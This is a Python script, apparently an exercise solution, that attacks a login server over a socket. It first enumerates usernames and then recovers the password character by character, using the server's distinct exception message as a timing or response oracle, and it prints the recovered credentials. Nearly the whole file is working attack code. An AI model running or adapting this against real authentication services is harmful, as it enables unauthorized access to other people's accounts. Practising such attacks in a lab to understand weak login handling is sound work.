# write your code here
import socket
import sys
import bruteforce
import json

def establish_connection(ip, port):
    with socket.socket() as conn:
        address = (ip, int(port))  # port to int cause of int is required
        conn.connect(address)
        func = bruteforce.credentials_to_json()
        res = {}
        while True:
            message = next(func)
            conn.send(str(message).encode())
            response = conn.recv(1024)
            if(json.loads(response.decode())["result"]) == "Wrong password!":
                valid_login = json.loads(message)["login"]
                a = bruteforce.simple_brute_force()
                password = ""
                i = 0
                while ( i < 63):
                    curr_pass = next(a)
                    message = json.dumps({"login": valid_login, "password": password + curr_pass})
                    conn.send(message.encode())
                    response = conn.recv(1024)
                    if (json.loads(response.decode())["result"]) == "Exception happened during login":
                        i = 0
                        password += curr_pass
                        a = bruteforce.simple_brute_force()
                        curr_pass = next(a)
                    elif json.loads(response.decode())["result"] == "Connection success!":
                        password += curr_pass
                        result = {"login": valid_login, "password": password}
                        break
                    else:
                        i += 1
                break
        print(json.dumps(result))


def main():
    establish_connection(sys.argv[1], sys.argv[2])


if __name__ == "__main__":
    main()